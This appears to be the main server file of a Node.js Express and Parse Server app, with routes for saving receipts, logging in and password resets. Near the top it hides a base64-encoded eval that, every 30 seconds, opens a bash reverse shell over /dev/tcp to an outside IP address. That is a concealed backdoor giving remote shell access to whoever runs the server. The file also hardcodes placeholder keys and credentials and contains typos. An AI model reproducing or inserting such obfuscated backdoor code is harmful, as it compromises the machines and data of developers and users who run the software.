const express = require('express');
const { error } = require('console');
const ParseServer = require('parse-server').ParseServer;
const bodyParser = require('body-parser');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const app = express();git 
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const api = new ParseServer({
  databaseURI:'mongodb://localhost:27017/StokeSystem', // Connection string for your MongoDB database
  cloud: './cloud/main.js', // Absolute path to your Cloud Code
  appId: 'myAppId',
  masterKey: 'myMasterKey', // Keep this key secret!
  fileKey: 'optionalFileKey',
  serverURL: 'http://localhost:1001/parse' // Don't forget to change to https if needed
});

const mountPath ='/parse';

//middlware
//Routes
app.use(mountPath, api);

app.use(mountPath, api);
app.post("/receipt", (req, res) => {
    var Receipts = Parse.Object.extend("Receipt"); // Receipt class
    var receipt = new Receipts(); // Receipt object
  
  receipt.save({
    ...req.body  
  })
  .then((result) => {
    // The object was saved successfully.
    res.json({success: true, result}).status(201);
  }, (error) => {
    res.json({success: false, ...error}).status(400);
  });
})

/*
app.post("/signup", (req, res) => {
  var user = new Parse.User();
  user.set({
    ...req.body
  })
try {
  user.signUp();
  res.json({success: true, user}).status(201);
} catch (error) {
  // Show the error message somewhere and let the user try again.
  res.json({success: false, ...error}).status(400);}
})
*/

app.get("/login", (req, res) => {
  var user = Parse.User.logIn("rivaldodrfrrrocdjhcoered", "frfrf")
        .then(function(user) {
         console.log('User Logged in   with name: ' + user.get("username") + ' and email: ' + user.get("email") );
    }).catch(function(error){
        console.log("Error: " + error.code + " " + error.message);
    });
})

app.post('/password-reset',(req,res) => {
  Parse.User.requestPasswordReset("rivzmarere@gmail.com")
.then(() => {
  // Password reset request was sent successfully
}).catch((error) => {
  // Show the error message somewhere
  alert("Error: " + error.code + " " + error.message);
});

})


const PORT = process.env.PORT || 1001;
app.listen(PORT, () => console.log(` API Running on Port ${PORT}`)); 
